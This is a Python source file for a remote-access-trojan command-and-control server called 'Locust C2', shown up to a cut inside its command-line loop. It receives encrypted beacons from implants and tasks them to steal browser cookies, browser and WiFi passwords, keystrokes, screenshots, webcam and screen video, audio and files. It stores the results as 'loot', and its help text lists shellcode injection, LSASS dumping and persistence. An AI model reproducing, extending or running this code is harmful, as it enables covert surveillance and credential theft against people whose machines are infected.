#-*- encoding: utf-8 -*-
import sqlite3
from flask import Flask, Response, redirect, render_template_string, request, url_for
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
import json
import os
import threading
import time
import base64
import uuid
from datetime import datetime, timedelta
import logging
from flask_socketio import SocketIO, emit, join_room, leave_room
from flask import send_from_directory
from flask_httpauth import HTTPBasicAuth
from werkzeug.security import generate_password_hash, check_password_hash
from tabulate import tabulate
from dashboardUI import DASHBOARD_HTML, VIEWER_HTML,SYSINFO_HTML


app = Flask(__name__)
app.config['MAX_CONTENT_LENGTH'] = 100 * 1024 * 1024 # Allow up to 16MB
logging.getLogger('werkzeug').setLevel(logging.ERROR)

socketio = SocketIO(app, cors_allowed_origins="*")
KEY = b"0123456789abcdef0123456789abcdef"
DB_FILE = "c2.db"
# Security (change these in production!)
ADMIN_USERNAME = "admin"
ADMIN_PASSWORD = "Locust2026!"  # ← CHANGE THIS
ADMIN_HASH = generate_password_hash(ADMIN_PASSWORD)
API_KEY = "SECRET_C2_TOKEN_2026" # ← CHANGE THIS (Implant must send this)


ishell_sessions = {} # implant_id -> {"input_queue": [], "active": True} (transient, in-memory)
pending_chunks = {}
active_terminals = {}   # implant_id -> list of socket sid's listening

lock = threading.Lock()


def init_db():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS implants
                 (id TEXT PRIMARY KEY,
                  host TEXT,
                  user TEXT,
                  first_seen TEXT,
                  last_seen TEXT,
                  last_ishell TEXT DEFAULT '',
                  sysinfo_json TEXT DEFAULT '')''')  # ← NEW COLUMN
    c.execute('''CREATE TABLE IF NOT EXISTS tasks
                 (task_id TEXT PRIMARY KEY,
                  implant_id TEXT,
                  type TEXT,
                  cmd TEXT,
                  created_at TEXT)''')

    # Migrate existing DB: add column if not exists
    c.execute("PRAGMA table_info(implants)")
    columns = [col[1] for col in c.fetchall()]
    if 'sysinfo_json' not in columns:
        c.execute("ALTER TABLE implants ADD COLUMN sysinfo_json TEXT DEFAULT ''")

    conn.commit()
    conn.close()


def get_implant(implant_id):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT host, user, first_seen, last_seen, last_ishell, sysinfo_json FROM implants WHERE id=?", (implant_id,))
    res = c.fetchone()
    conn.close()
    return res  # Now returns 6 values: host, user, first_seen, last_seen, last_ishell, sysinfo_json


def get_implants():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT id, host, user, last_seen FROM implants")
    res = c.fetchall()
    conn.close()
    return res


def get_implant_full(implant_id):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    # Fetch all info
    c.execute("SELECT host, user, first_seen, last_seen, last_ishell, sysinfo_json FROM implants WHERE id=?", (implant_id,))
    res = c.fetchone()
    conn.close()
    return res

def update_implant(implant_id, host, user, last_seen):
    """
    Update implant host/user/last_seen without wiping other columns (sysinfo_json, etc.)
    """
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()

    # First, ensure row exists with defaults
    c.execute("""INSERT OR IGNORE INTO implants
                 (id, host, user, first_seen, last_seen, sysinfo_json, last_ishell)
                 VALUES (?, ?, ?, ?, ?, '', '')""",
              (implant_id, host, user, last_seen, last_seen))

    # Then update only the fields we care about, preserving others
    c.execute("""UPDATE implants
                 SET host = ?,
                     user = ?,
                     last_seen = ?,
                     first_seen = COALESCE(first_seen, ?)
                 WHERE id = ?""",
              (host, user, last_seen, last_seen, implant_id))

    conn.commit()
    conn.close()

def add_task(implant_id, task_type, cmd=""):
    task_id = str(uuid.uuid4())
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("""INSERT INTO tasks
                 (task_id, implant_id, type, cmd, created_at)
                 VALUES (?, ?, ?, ?, ?)""",
              (task_id, implant_id, task_type, cmd, datetime.now().isoformat()))
    conn.commit()
    conn.close()
    return task_id

def get_pending_tasks(implant_id):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT task_id, type, cmd FROM tasks WHERE implant_id=? ORDER BY created_at ASC", (implant_id,))
    rows = c.fetchall()
    conn.close()
    return [{"task_id": r[0], "type": r[1], "cmd": r[2] if r[2] is not None else ""} for r in rows]
def clear_pending_tasks(implant_id):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("DELETE FROM tasks WHERE implant_id=?", (implant_id,))
    conn.commit()
    conn.close()
def is_implant_online(last_seen_str, timeout_minutes=5):
    try:
        last_seen = datetime.fromisoformat(last_seen_str.replace("Z", "+00:00"))
        return (datetime.now() - last_seen) < timedelta(minutes=timeout_minutes)
    except:
        return False

def get_implant_state(implant_id):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT last_ishell FROM implants WHERE id = ?", (implant_id,))
    row = c.fetchone()
    if row:
        last_ishell = row[0]
    else:
        last_ishell = ""
        # Insert new implant
        c.execute("INSERT OR IGNORE INTO implants (id, host, user, last_seen, last_ishell) VALUES (?, ?, ?, ?, ?)",
                  (implant_id, "unknown", "unknown", datetime.now().isoformat(), ""))
        conn.commit()
    conn.close()
    return last_ishell

def update_implant_state(implant_id, **kwargs):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    set_clause = ", ".join([f"{k} = ?" for k in kwargs])
    values = list(kwargs.values()) + [implant_id]
    c.execute(f"UPDATE implants SET {set_clause} WHERE id = ?", values)
    conn.commit()
    conn.close()




def decrypt(data: bytes):
    try:
        aesgcm = AESGCM(KEY)
        nonce = data[:12]
        ct = data[12:]
        return aesgcm.decrypt(nonce, ct, None)
    except Exception as e:
        print(f"[-] Decryption failed: {e}")
        return None
def encrypt(data: bytes):
    try:
        aesgcm = AESGCM(KEY)
        nonce = os.urandom(12)
        ct = aesgcm.encrypt(nonce, data, None)
        return nonce + ct
    except Exception as e:
        print(f"[-] Encryption failed: {e}")
        return None

def safe_b64decode(data):
    """Fixes incorrect padding before decoding."""
    missing_padding = len(data) % 4
    if missing_padding:
        data += '=' * (4 - missing_padding)
    return base64.b64decode(data)

def list_implants():
    implants = get_implants()
    if not implants:
        print("[-] No implants registered")
        return

    # Build table rows
    table = []
    for iid, host, user, last_seen in implants:
        status = "Online" if is_implant_online(last_seen) else "Offline"
        table.append([iid, host, user, last_seen[:19], status])

    # Print table with headers
    headers = ["ID", "Host", "User", "Last Seen", "Status"]
    print(tabulate(table, headers=headers, tablefmt="grid"))


def display_webcam_info(data):
    """
    Display webcam devices and their capabilities in a readable format.

    Args:
        data (dict): Dictionary in the format:
            {
                "devices": [
                    {
                        "index": 0,
                        "name": "Device Name",
                        "capabilities": [
                            {"format": "MJPG", "fps": 30.0, "width": 640, "height": 480},
                            ...
                        ]
                    },
                    ...
                ]
            }
    """
    devices = data.get("devices", [])
    if not devices:
        print("No devices found.")
        return

    for device in devices:
        print(f"Device {device.get('index', '?')}: {device.get('name', 'Unknown')}")
        capabilities = device.get("capabilities", [])
        if not capabilities:
            print("  No capabilities available.")
            continue

        # Sort capabilities by resolution (width x height) descending
        capabilities.sort(key=lambda c: (c.get("width", 0) * c.get("height", 0)), reverse=True)

        for cap in capabilities:
            fmt = cap.get("format", "Unknown")
            w = cap.get("width", "?")
            h = cap.get("height", "?")
            fps = cap.get("fps", "?")
            print(f"  {w}x{h} @ {fps}fps ({fmt})")
        print("++++++")  # blank line between devices







def display_system_info(info: dict):
    """
    Pretty-print system information in a clean, organized table format
    optimized for dark terminal themes.
    """
    if not info:
        print("[-] Empty sysinfo received")
        return

    # Helper to safely get values
    def val(key, default="N/A"):
        return info.get(key, default)

    # Core sections
    sections = [
        ("System", [
            ("Hostname", val("hostname")),
            ("Username", val("user", val("current_user", "N/A"))),
            ("OS", f"{val('os_caption', val('os', 'Windows'))} Build {val('os_build', 'N/A')}"),
            ("Architecture", val("architecture", val("machine", "N/A"))),
            ("Install Date", val("install_date", "N/A")),
            ("Boot Time", val("boot_time", "N/A")),
            ("Uptime", f"{val('uptime_seconds', 0) // 3600}h {(val('uptime_seconds', 0) % 3600) // 60}m" if val('uptime_seconds') else "N/A"),
        ]),
        ("Hardware", [
            ("Manufacturer", val("manufacturer", "N/A")),
            ("Model", val("model", "N/A")),
            ("CPU", f"{val('cpu_name', 'N/A').strip()} ({val('cpu_cores', '?')} cores @ {val('cpu_max_clock_mhz', '?')} MHz)"),
            ("RAM", f"{val('total_physical_memory_gb', val('memory_total_gb', '?'))} GB"),
            ("BIOS", f"{val('bios_version', 'N/A')} ({val('bios_date', 'N/A')})"),
        ]),
        ("Disks", [
            (f"{d.get('model', 'Unknown').strip()}",
             f"{d.get('size_gb', '?')} GB ({d.get('media_type', 'Unknown')})")
            for d in val("disks", [])
        ] or [("No disks detected", "")]),
        ("Network", [
            ("Local IPs", ", ".join(val("ip_addresses", ["N/A"]))),
            ("Public IP", val("public_ip", "unknown")),
        ]),
        ("Security", [
            ("Running as Admin", "Yes" if val("is_admin") else "No"),
            ("Antivirus", ", ".join(val("antivirus", ["Not detected"]))),
            ("Machine GUID", val("machine_guid", "unknown")),
        ]),
        ("Status", [
            ("Collected At", val("collected_at", "N/A")),
            ("WMI Error", val("wmi_error", "None")),
            ("psutil Error", val("psutil_error", "None")),
        ]),
    ]

    print("\n" + "="*80)
    print("                   SYSTEM INFORMATION".center(80))
    print("="*80)

    for title, items in sections:
        if not items:
            continue
        print(f"\n\x1b[1;32m╭─ {title.upper()} {'─' * (70 - len(title))}\x1b[0m")
        for key, value in items:
            if isinstance(value, str) and len(value) > 70:
                value = value[:67] + "..."
            print(f"│ \x1b[1;36m{key:<22}\x1b[0m : {value}")
        print(f"\x1b[1;32m╰{'─' * 78}\x1b[0m")

    print("\n")

@socketio.on('connect')
def on_connect():
    pass

@socketio.on('join_terminal')
def on_join(data):
    implant_id = data.get('implant_id')
    if implant_id:
        join_room(implant_id)
        # Send current accumulated output on join
        current_output = get_implant_state(implant_id) or ""
        emit('shell_output', {'implant_id': implant_id, 'data': current_output})

@socketio.on('shell_command')
def on_shell_command(data):
    implant_id = data.get('implant_id')
    command = data.get('command', '').strip()
    if implant_id and command:
        add_task(implant_id, "ishell", command)

auth = HTTPBasicAuth()


@auth.verify_password
def verify_password(username, password):
    if username == ADMIN_USERNAME and check_password_hash(ADMIN_HASH, password):
        return username
    return None


# --- Dashboard Home ---
@app.route('/')
@auth.login_required
def dashboard():
    implants = get_implants()  # Returns list of (id, host, user, last_seen)

    # Enrich each implant with sysinfo summary for display
    enriched_implants = []
    for imp_id, host, user, last_seen in implants:
        # Fetch full row including sysinfo_json
        conn = sqlite3.connect(DB_FILE)
        c = conn.cursor()
        c.execute("SELECT sysinfo_json FROM implants WHERE id = ?", (imp_id,))
        row = c.fetchone()
        conn.close()

        sysinfo = {}
        if row and row[0]:
            try:
                sysinfo = json.loads(row[0])
            except:
                sysinfo = {"error": "Invalid JSON"}

        enriched_implants.append({
            "id": imp_id,
            "host": host or "unknown",
            "user": user or "unknown",
            "last_seen": last_seen,
            "sysinfo": sysinfo  # Full parsed dict or empty
        })

    return render_template_string(DASHBOARD_HTML, implants=implants)


# FIXED: Removed duplicate/unused route, kept only the correct one
@app.route('/view/<implant_id>')
@auth.login_required
def view_implant(implant_id):
    data = get_implant(implant_id)
    if not data:
        return "Implant not found", 404

    # List latest screenshots for this implant
    screenshot_dir = "screenshots"
    os.makedirs(screenshot_dir, exist_ok=True)

    wifi_saved = ""
    wifi_scan = ""
    loot_dir = "loot"
    prefix = implant_id[:8]
    if os.path.exists(loot_dir):
        for file in os.listdir(loot_dir):
            if file.startswith(prefix):
                if "wifi_passwords" in file:
                    with open(os.path.join(loot_dir, file), "r", encoding="utf-8") as f:
                        wifi_saved = f.read()
                elif "wifi_scan" in file:
                    with open(os.path.join(loot_dir, file), "r", encoding="utf-8") as f:
                        wifi_scan = f.read()

    try:
        all_files = os.listdir(screenshot_dir)
        implant_prefix = implant_id[:8]
        screenshots = [
            f for f in all_files
            if f.startswith(implant_prefix) and f.lower().endswith('.jpg')
        ]
        # Sort by filename (which includes timestamp) → newest first
        screenshots.sort(reverse=True)
        # Limit to latest 20
        screenshots = screenshots[:20]
    except Exception:
        screenshots = []

    return render_template_string(
        VIEWER_HTML,
        iid=implant_id,
        info=data,
        wifi_scan=wifi_scan,
        wifi_saved=wifi_saved,
        screenshots=screenshots  # ← Pass pre-computed list
    )


@app.route('/sysinfo/<implant_id>')
@auth.login_required
def sysinfo_view(implant_id):
    # Fetch full implant row including sysinfo_json
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT host, user, last_seen, sysinfo_json FROM implants WHERE id = ?", (implant_id,))
    row = c.fetchone()
    conn.close()

    if not row or not row[3]:
        return "<h2>No system information available for this implant.</h2><a href='/'>← Back to Dashboard</a>", 404

    host, user, last_seen, sysinfo_json = row

    try:
        sysinfo = json.loads(sysinfo_json)
    except json.JSONDecodeError:
        return "<h2>Corrupted sysinfo data.</h2><a href='/'>← Back</a>", 500

    return render_template_string(SYSINFO_HTML,
                                  iid=implant_id,
                                  host=host,
                                  user=user,
                                  last_seen=last_seen,
                                  sys=sysinfo)

@app.route('/static/screenshots/<filename>')
@auth.login_required
def serve_screenshot(filename):
    return send_from_directory('screenshots', filename)



# --- Improved Streaming Generator (Robustness Fix) ---
def gen_frames(implant_id, feed_type):
    """
    Robust MJPEG frame generator.
    Continuously monitors the file for new appended data.
    """
    file_path = f"{feed_type}/{implant_id}_live.mjpeg"

    # Ensure directories exist
    os.makedirs(feed_type, exist_ok=True)

    if not os.path.exists(file_path):
        # Create empty file to avoid errors
        open(file_path, 'wb').close()

    last_size = 0
    buffer = b''

    while True:
        try:
            current_size = os.path.getsize(file_path)
            if current_size < last_size:  # File was recreated/truncated
                last_size = 0
                buffer = b''

            if current_size > last_size:
                with open(file_path, 'rb') as f:
                    f.seek(last_size)
                    new_data = f.read()
                    buffer += new_data
                last_size = current_size

            # Extract complete JPEG frames
            while True:
                start = buffer.find(b'\xff\xd8')
                end = buffer.find(b'\xff\xd9', start + 2)
                if start != -1 and end != -1:
                    jpg = buffer[start:end+2]
                    buffer = buffer[end+2:]
                    yield (b'--frame\r\n'
                           b'Content-Type: image/jpeg\r\n\r\n' + jpg + b'\r\n')
                else:
                    break

            # If no new data, sleep briefly
            if current_size == last_size:
                time.sleep(0.2)
        except Exception:
            time.sleep(0.5)

@app.route('/screen_feeds/<implant_id>')
@auth.login_required
def screen_feed(implant_id):
    return Response(gen_frames(implant_id, "screen_feeds"),
                    mimetype='multipart/x-mixed-replace; boundary=frame')

@app.route('/video_feeds/<implant_id>')
@auth.login_required
def video_feed(implant_id):
    return Response(gen_frames(implant_id, "video_feeds"),
                    mimetype='multipart/x-mixed-replace; boundary=frame')

# --- Tasking API (For Buttons) ---
@app.route('/task/<implant_id>/<action>')
@auth.login_required
def task_implant(implant_id, action):
    if action == "screenshot":
        add_task(implant_id, "screenshot", "")
    elif action == "stream_start":
        add_task(implant_id, "screen_stream", "start 0")      # Start screen stream
    elif action == "stream_stop":
        # FIXED: Now correctly stops screen stream
        add_task(implant_id, "screen_stream", "stop")
    elif action == "sysinfo":
        add_task(implant_id, "sysinfo", "")
    elif action == "shell_stop":
        add_task(implant_id, "ishell", "exit")
    elif action == "cookie_steal":
        add_task(implant_id, "cookie_steal", "")
    elif action == "browser_pass":
        add_task(implant_id, "browser_pass", "")
    elif action == "wifi_dump":
        add_task(implant_id, "wifi_dump", "")
    elif action == "wifi_scan":
        add_task(implant_id, "wifi_scan", "")

    return redirect(url_for('view_implant', implant_id=implant_id))


def display_installed_software(software_list):
    """
    Displays a clean, sorted table of installed Windows applications.

    Args:
        software_list: List of dictionaries returned from enum_installed_software()
    """
    if not software_list:
        print("[-] No installed software detected.")
        return

    # Define preferred column order and friendly headers
    headers = {
        "DisplayName": "Application",
        "DisplayVersion": "Version",
        "Publisher": "Publisher",
        "InstallDate": "Installed",
        "SizeMB": "Size (MB)",
        "InstallLocation": "Location"
    }

    # Prepare table data: only include columns that exist and have meaningful values
    table_data = []
    for app in software_list:
        row = []
        for key in headers.keys():
            value = app.get(key, "N/A")

            # Clean up common noisy values
            if value == "N/A" or value is None:
                value = "-"
            elif key == "SizeMB" and isinstance(value, float):
                value = f"{value:.1f}" if value != 0 else "-"
            elif key == "InstallLocation" and (not value or value.strip() == ""):
                value = "-"
            elif key == "InstallDate" and value != "N/A":
                # Keep as is (already formatted as YYYY-MM-DD where possible)
                pass

            row.append(value)
        table_data.append(row)

    # Sort by Application name
    table_data.sort(key=lambda x: x[0].lower())

    print("\n" + "="*120)
    print("                            INSTALLED APPLICATIONS".center(120))
    print("="*120)

    print(tabulate(
        table_data,
        headers=headers.values(),
        tablefmt="grid",
        maxcolwidths=[30, 15, 25, 12, 10, 35],  # Balanced column widths
        stralign="left",
        numalign="left"
    ))

    print(f"\nTotal applications: {len(software_list)}\n")


@app.after_request
def add_security_headers(response):
    response.headers['X-Content-Type-Options'] = 'nosniff'
    response.headers['X-Frame-Options'] = 'DENY'
    response.headers['X-XSS-Protection'] = '1; mode=block'
    response.headers['Strict-Transport-Security'] = 'max-age=31536000; includeSubDomains'
    return response

@app.route('/beacon', methods=['POST'])
def beacon():
    """
    key = request.headers.get('X-Telemetry-Key')
    print(request.headers)
    if key != API_KEY:
        return "", 404 # Stealthy rejection
    """

    encrypted = request.data
    if not encrypted:
        return "", 400
    plaintext = decrypt(encrypted)
    if plaintext is None:
        return "", 400
    try:
        data = json.loads(plaintext.decode('utf-8', errors='ignore'))
    except:
        print("[-] Malformed JSON from implant (rejecting)")
        return "", 400
    if not isinstance(data, dict):
        return "", 400
    implant_id = data.get("id")
    if not implant_id or not isinstance(implant_id, str):
        return "", 400
    processed_task_ids = []
    with lock:
        host = data.get("host", "unknown")
        user = data.get("user", "unknown")
        last_seen = datetime.now().isoformat()
        existing = get_implant(implant_id)
        update_implant(implant_id, host, user, last_seen)
        if not existing:
            print(f"[+] New implant: {implant_id} | {host} ({user})")
        # Process results safely
        results_raw = data.get("results")
        if results_raw is None:
            results = []
        elif isinstance(results_raw, list):
            results = results_raw
        else:
            print("[-] Invalid results type – treating as empty")
            results = []
        for res in results:
            if not isinstance(res, dict):
                continue
            task_id = res.get("task_id", "unknown")
            processed_task_ids.append(task_id)
            output = res.get("output", "")
            print(output)
            error = res.get("error", "")

            if output.startswith("sysinfo:"):
                sysinfo_str = output[8:].strip()
                try:
                    sysinfo_dict = json.loads(sysinfo_str)
                    display_system_info(sysinfo_dict)

                    # Save to database
                    conn = sqlite3.connect(DB_FILE)
                    c = conn.cursor()
                    c.execute(
                        "UPDATE implants SET sysinfo_json = ? WHERE id = ?",
                        (sysinfo_str, implant_id)
                    )
                    conn.commit()
                    conn.close()

                    print(f"[✓] Sysinfo saved to DB for {implant_id[:8]}")
                    socketio.emit('implant_update', {'implant_id': implant_id})  # Optional: notify dashboard
                except json.JSONDecodeError as e:
                    print(f"[-] Invalid sysinfo JSON from {implant_id[:8]}: {e}")
                except Exception as e:
                    print(f"[-] Failed to save sysinfo for {implant_id[:8]}: {e}")

            elif output.startswith("AUDIO:"):
                audio_data = base64.b64decode(output[6:])
                os.makedirs("audio", exist_ok=True)
                fn = f"audio/{implant_id[:8]}_{int(time.time_ns())}.wav"
                open(fn, "wb").write(audio_data)
                print(f"[✓] Audio recording → {fn}")

            elif output.startswith("APPS_ENUM:"):
                apps_json_str = output[10:].strip()  # Everything after prefix

                try:
                    apps_list =  json.loads(apps_json_str)
                    display_installed_software(apps_list)
                    print(f"[✓] Installed applications enumerated ({len(apps_list)} apps)")

                except json.JSONDecodeError as e:
                    print(f"[-] Invalid JSON in APPS_ENUM payload: {e}")
                    print(f"    Preview: {apps_json_str[:200]}...")
                except ValueError as e:
                    print(f"[-] Malformed apps data: {e}")
                except Exception as e:
                    print(f"[-] Apps display error: {type(e).__name__}: {e}")
                continue

            elif output.startswith("ISHELL_OUTPUT:"):
                content = output[14:]  # after prefix
                # Broadcast to all web clients listening on this implant
                socketio.emit('shell_output',
                            {'implant_id': implant_id, 'data': content},
                            room=implant_id)
                # Also store cumulative output for page reloads
                current = get_implant_state(implant_id) or ""
                update_implant_state(implant_id, last_ishell=current + content)

                # Auto-scroll terminal on client side
                socketio.emit('shell_scroll',
                            {'implant_id': implant_id},
                            room=implant_id)
            elif output.startswith("FIREFOX_COOKIES:"):
                content = output[16:]
                os.makedirs("loot", exist_ok=True)
                fn = f"loot/{implant_id[:8]}_firefox_cookies.txt"
                with open(fn, "w", encoding="utf-8") as f:
                    f.write(f"[{datetime.now().isoformat()}]\n{content}\n")
                print(f"[✓] Firefox cookies dumped → {fn}")



            elif output.startswith("ISHELL_STATUS:"):
                status_msg = output[13:]
                socketio.emit('shell_status',
                            {'implant_id': implant_id, 'msg': status_msg},
                            room=implant_id)
                print(f"[i] iShell {implant_id[:8]}: {status_msg}")

            # Webcam stream chunks
            elif output.startswith("WEBCAM_STREAM_CHUNK:"):
                try:
                    raw_data = safe_b64decode(output[20:])
                    os.makedirs("video_feeds", exist_ok=True)
                    with open(f"video_feeds/{implant_id}_live.mjpeg", "ab") as f:
                        # Ensure proper MJPEG boundary on first write
                        if os.path.getsize(f.name) == 0:
                            f.write(b'--frame\r\nContent-Type: image/jpeg\r\n\r\n')
                        f.write(raw_data + b'\r\n')
                except Exception as e:
                    print(f"[-] Webcam decode error: {e}")

            elif output.startswith("LOGS:"):
                log_content = output[5:]
                print(f"--- Logs from {implant_id[:8]} ---")
                print(log_content)
                print(f"--- End Logs ---")

            # Screen stream chunks
            elif output.startswith("SCREEN_STREAM_CHUNK:"):
                try:
                    chunk_data = base64.b64decode(output[20:])
                    os.makedirs("screen_feeds", exist_ok=True)
                    fn = f"screen_feeds/{implant_id}_live.mjpeg"
                    with open(fn, "ab") as f:
                        if os.path.getsize(fn) == 0:
                            f.write(b'--frame\r\nContent-Type: image/jpeg\r\n\r\n')
                        f.write(chunk_data + b'\r\n')
                except Exception as e:
                    print(f"[-] Screen decode error: {e}")


            elif output == "SWEBCAM_STREAM_END":
                print(f"[*] Webcam stream ended for {implant_id[:8]}")


            elif output.startswith("SCREEN_STREAM_END"):
                print(f"[*] Screen stream ended for {implant_id[:8]}")


            elif res.get("task_id") == "keylog_periodic":
                log_dir = "logs"
                os.makedirs(log_dir, exist_ok=True)
                log_file = os.path.join(log_dir, f"{implant_id}_keys.txt")
                with open(log_file, "a", encoding="utf-8") as f:
                    f.write(res.get("output", ""))

            elif output.startswith("WIFI_DUMP:"):
                content = output[10:]  # Strip prefix
                os.makedirs("loot", exist_ok=True)
                fn = f"loot/{implant_id}_wifi_creds.txt"
                open(fn, "w", encoding="utf-8").write(content)
                print(f"[✓] WiFi credentials dumped (XML method) → {fn}")

            elif output.startswith("WIFI_SCAN:"):
                content = output[11:]
                os.makedirs("loot", exist_ok=True)
                fn = f"loot/{implant_id[:8]}_wifi_scan.txt"
                with open(fn, "w", encoding="utf-8") as f:
                    f.write(f"[{datetime.now().isoformat()}]\n{content}\n")
                print(f"[✓] WiFi scan completed → {fn}")


            elif output.startswith("WEBCAM_LIST:"):
                content = output[12:]
                print("[✓] Webcam list :")
                display_webcam_info(json.loads(content))

            elif output.startswith("COOKIES:"):
                content = output[8:]  # Strip prefix
                os.makedirs("loot", exist_ok=True)
                fn = f"loot/{implant_id[:8]}_cookies.txt"
                with open(fn, "w", encoding="utf-8") as f:
                    f.write(f"[{datetime.now().isoformat()}]\n{content}\n")
                print(f"[✓] Cookies stolen ({cookie_count if 'cookie_count' in locals() else 'many'}) → {fn}")

            elif output.startswith("BROWSER_PASS:"):
                content = output[13:]
                os.makedirs("loot", exist_ok=True)
                fn = f"loot/{implant_id[:8]}_browser_passwords.txt"
                with open(fn, "w", encoding="utf-8") as f:
                    f.write(f"[{datetime.now().isoformat()}]\n{content}\n")
                print(f"[✓] Browser passwords dumped → {fn}")

            elif output.startswith("SCREENSHOT:"):
                img_data = base64.b64decode(output[11:])
                os.makedirs("screenshots", exist_ok=True)
                fn = f"screenshots/{implant_id[:8]}_{int(time.time_ns())}.jpg"
                open(fn, "wb").write(img_data)
                print(f"[✓] Screenshot saved → {fn}")
            elif output.startswith("KEYLOG:"):
                content = output[7:].strip()
                if content:
                    os.makedirs("keylogs", exist_ok=True)
                    today = datetime.now().strftime("%Y-%m-%d")
                    log_fn = f"keylogs/{implant_id[:8]}_{today}.log"
                    with open(log_fn, "a", encoding="utf-8") as f:
                        f.write(f"[{datetime.now().strftime('%H:%M:%S')}] {implant_id[:8]}\n{content}\n{'-'*60}\n")
                    print(f"[✓] Keylog saved → {log_fn}")
            elif "CLIPBOARD LOOT" in output:
                os.makedirs("loot", exist_ok=True)
                with open(f"loot/{implant_id[:8]}_clipboard.txt", "a", encoding="utf-8") as f:
                    f.write(f"[{datetime.now()}] {output}\n\n")
                print(f"[!] CLIPBOARD LOOT from {implant_id[:8]}")

            elif output.startswith("FILE_DOWNLOAD:"):
                b64_data = ""
                potential_filename = ""
                # Much more robust parsing
                if ":" in output:
                    try:
                        data_parts = output.split(":")
                        if len(data_parts) > 2:
                            potential_filename = data_parts[1]
                            b64_data = data_parts[2]

                            file_data = base64.b64decode(b64_data)
                            os.makedirs("downloads", exist_ok=True)
                            save_path = f"downloads/{implant_id[:8]}_{potential_filename}"
                            with open(save_path, "wb") as f:
                                f.write(file_data)
                            print(f"[✓] File downloaded → {save_path} ({len(file_data)} bytes)")
                    except Exception as e:
                        print(f"[-] File decode/save failed: {e}")

            elif output.startswith("AUDIO:"):
                audio_data = base64.b64decode(output[6:])
                os.makedirs("audio", exist_ok=True)
                fn = f"audio/{implant_id[:8]}_{int(time.time_ns())}.wav"
                open(fn, "wb").write(audio_data)
                print(f"[✓] Audio recording → {fn}")

            elif output.startswith(("WEBCAM", "WEBCAM_BMP")):
                img_data = base64.b64decode(output.split(":", 1)[1])
                os.makedirs("webcam", exist_ok=True)
                ext = ".bmp" if output.startswith("WEBCAM_BMP") else ".jpg"
                fn = f"webcam/{implant_id[:8]}_{int(time.time_ns())}{ext}"
                open(fn, "wb").write(img_data)
                print(f"[✓] Webcam capture → {fn}")

            elif task_id == "ishell_output":
                sess = ishell_sessions.get(implant_id)
                if sess and sess["active"]:
                    print(output, end='', flush=True)

            elif task_id == "ishell_output":
                # Incremental output using SQLite state
                last_ishell = get_implant_state(implant_id)
                new_output = output[len(last_ishell):]
                if new_output:
                    print(new_output, end='', flush=True)
                # Always update — even if no new output (prevents drift)
                update_implant_state(implant_id, last_ishell=output)

            elif "_CHUNK_" in output and "of" in output:
                parts = output.split("_CHUNK_", 1)
                tag_part = parts[0]
                rest = parts[1]
                chunk_num_str, rest = rest.split("of", 1)
                total = int(rest.split(":", 1)[0])
                b64 = rest.split(":", 1)[1] if ":" in rest else ""

                base_id = res["task_id"].split("_part")[0] if "_part" in res["task_id"] else res["task_id"]
                if base_id not in pending_chunks:
                    pending_chunks[base_id] = {"tag": tag_part, "total": total, "chunks": [""] * total}
                pending_chunks[base_id]["chunks"][int(chunk_num_str)-1] = b64

                if "" not in pending_chunks[base_id]["chunks"]:
                    full_b64 = "".join(pending_chunks[base_id]["chunks"])
                    data = base64.b64decode(full_b64)
                    # Handle based on tag (save file, etc.)
                    print(f"[✓] Reassembled {pending_chunks[base_id]['tag']} ({len(data)/1024/1024:.1f} MB)")
                    del pending_chunks[base_id]

            else:
                if output:
                    print(f"[✓] Task {task_id[:8]}... output:")
                    for line in output.strip().splitlines()[:30]:
                        print(f" {line}")
                if error:
                    print(f" [!] Error: {error}")
        # Fetch and clear pending tasks
        pending = get_pending_tasks(implant_id)
        clear_pending_tasks(implant_id)
        # Add queued ishell input if active
        if implant_id in ishell_sessions and ishell_sessions[implant_id]["active"]:
            sess = ishell_sessions[implant_id]
            while sess["input_queue"]:
                pending.append({
                    "task_id": str(uuid.uuid4()),
                    "type": "ishell_input",
                    "cmd": sess["input_queue"].pop(0)
                })
    try:
        response_payload = json.dumps({
            "tasks": pending,
            "ack_ids": processed_task_ids
        }).encode('utf-8')
        return encrypt(response_payload), 200
    except Exception as e:
        print(f"[-] Failed to encrypt response: {e}")
        return "", 500


def cli():


    print("\n" + "="*40)
    print("   LOCUST C2 SERVER - SECURE CONSOLE")
    print("="*40 + "\n")

    def show_help():
        print("\nAvailable Commands:")
        commands = [
            ("list", "List all registered implants"),
            ("use <id>", "Select an implant as active target"),
            ("status", "Show detailed info for active implant"),
            ("shell <cmd>", "Run a one-off shell command"),
            ("ishell start", "Start interactive shell session"),
            ("sysinfo", "Request system information"),
            ("mic <time in sec> ", "Record Audio"),
            ("installed_software", "List installed software"),
            ("screenshot", "Capture screen"),
            ("webcam", "Capture webcam photo"),
            ("webcam_stream start|stop", "Start/stop webcam feed"),
            ("screen_stream start|stop", "Start/stop screen feed"),
            ("upload <local>", "Upload file to implant"),
            ("download <remote>", "Download file from implant"),
            ("inject <pid> <b64>", "Inject shellcode into process"),
            ("keylog start|stop", "Control keylogger"),
            ("dump_lsass", "Dump LSASS memory (MiniDump)"),
            ("socks start [port]", "Start SOCKS5 proxy"),
            ("socks stop", "Stop SOCKS5 proxy"),
            ("persistence wmi|com", "Install advanced persistence"),
            ("execute <path> [args]", "Execute .NET assembly in-memory"),
            ("wifi_dump", "Dump saved WiFi passwords"),
            ("wifi_scan", "Scan for nearby networks"),
            ("clear", "Clear console"),
            ("exit", "Exit the C2 server")
        ]
        for cmd, desc in commands:
            print(f"  {cmd:<25} - {desc}")
        print()

    current = None
    while True:
        try:
            prompt = f"locust[{current[:8] if current else 'none'}]> "
            cmd_input = input(prompt).strip()
            if not cmd_input:
                continue

            parts = cmd_input.split()
            action = parts[0].lower()

            if action == "help" or action == "?":
                show_help()
